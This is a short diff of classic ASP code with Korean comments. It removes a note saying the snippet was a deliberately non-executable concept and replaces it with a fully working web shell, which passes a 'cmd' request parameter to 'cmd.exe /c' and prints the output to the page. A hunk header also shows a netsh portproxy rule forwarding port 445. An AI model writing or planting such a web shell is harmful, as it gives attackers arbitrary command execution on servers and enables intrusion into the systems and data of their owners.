@@ -46,10 +46,18 @@ netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connec
 
 
 
-' 취약한 코드 패턴 예시 (보안상 실행 불가능하도록 개념만 표현)
 <%
-    ' 외부 입력을 전달받아 검증 없이 Exec 또는 Run 실행
     cmd = Request("cmd")
-    Set shell = Server.CreateObject("WScript.Shell")
-    ' ... 시스템 명령 실행 및 결과 출력 ...
+    If cmd <> "" Then
+        Set shell = Server.CreateObject("WScript.Shell")
+        
+        ' 1. Exec 메서드로 cmd.exe를 통해 명령어 실행
+        Set execObj = shell.Exec("cmd.exe /c " & cmd)
+        
+        ' 2. 실행된 명령어의 표준 출력(StdOut) 결과를 읽어옴
+        result = execObj.StdOut.ReadAll()
+        
+        ' 3. 읽어온 결과를 HTML/웹 페이지에 출력
+        Response.Write "<pre>" & Server.HTMLEncode(result) & "</pre>"
+    End If
 %>
